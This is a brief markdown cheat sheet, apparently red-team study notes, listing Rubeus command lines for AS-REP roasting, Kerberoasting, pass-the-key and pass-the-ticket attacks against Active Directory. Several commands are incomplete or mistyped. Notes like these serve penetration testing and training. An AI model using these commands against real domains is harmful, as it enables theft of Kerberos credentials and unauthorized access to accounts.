# Rubeus

# Source

- https://github.com/GhostPack/Rubeus

Review the opsec notes before compiling the program in visual studio.

## ASREProasting:

chek for users in the current domain:

- Rubeus.exe asreproast /format:<AS_REP_responses_format [hashcat | john]> /outfile:

## Kerberoasting:

- Rubeus.exe kerberoast /outfile:
- Rubeus.exe kerberoast /outfile:hashes.txt [/spn:“SID-VALUE”] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:“OU=,…”]

## Pass the key (PTK):

- ..exe asktgt /domain:
    
    /user: /rc4: /ptt
    

## Using the ticket on a Windows target:

- Rubeus.exe ptt /ticket: